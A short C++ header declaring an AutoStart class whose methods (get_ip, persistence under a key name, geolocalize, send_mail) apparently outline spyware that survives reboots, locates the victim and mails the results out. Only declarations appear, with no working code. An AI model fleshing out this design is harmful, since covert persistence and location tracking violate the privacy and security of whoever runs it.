#pragma once
#include <Windows.h>
#include <vector>
#include <locale>
#include <sstream>
#include <iostream>

class AutoStart
{
public:
	static std::string get_ip();
	static bool persistence(const wchar_t* keyname);
	static void geolocalize();
	static void send_mail();
};

